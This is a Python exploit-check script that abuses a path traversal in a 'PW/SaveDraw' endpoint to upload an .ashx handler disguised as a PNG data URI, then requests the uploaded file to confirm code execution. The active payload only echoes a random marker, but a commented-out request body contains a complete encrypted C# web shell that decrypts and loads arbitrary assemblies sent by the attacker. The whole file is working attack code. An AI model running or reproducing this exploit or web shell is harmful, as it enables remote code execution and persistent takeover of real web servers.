import requests,re,urllib3,time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
filename=randomInt(100000, 999999)
content=randomLowercase(10)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"PW/SaveDraw?path=../../Content/img&idx={filename}.ashx"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded"}
	# body='data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.IO;using System.Reflection;using System.Text;using System.Web;using System.Web.SessionState;using System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void ProcessRequest(HttpContext context){try{string key = "affdccb649fde573";byte[] k = Encoding.Default.GetBytes(key);context.Session.Add("sky", key);StreamReader sr = new StreamReader(context.Request.InputStream);string line = sr.ReadLine();if (!string.IsNullOrEmpty(line)){byte[] c = Convert.FromBase64String(line);Assembly assembly = typeof(Environment).Assembly;RijndaelManaged rm =(RijndaelManaged) assembly.CreateInstance("System.Secur"+"ity.Crypto"+"graphy.Rijnda"+"elManaged");byte[] data=rm.CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length);Assembly.Load(data).CreateInstance("U").Equals(context);sr.Close();}}catch {}}public bool IsReusable{get{return false;}}}}---'
	body='data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.IO;using System.Reflection;using System.Text;using System.Web;using System.Web.SessionState;using System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void ProcessRequest(HttpContext context){try{context.Response.Write("'+content+'");}catch {}}public bool IsReusable{get{return false;}}}}---'
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	response.encoding='utf-8'
	if response.status_code==200:
		r0=True
	else:
		r0=False
	url=baseurl+f'Content/img/UserDraw/drawPW{filename}.ashx'
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if content in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
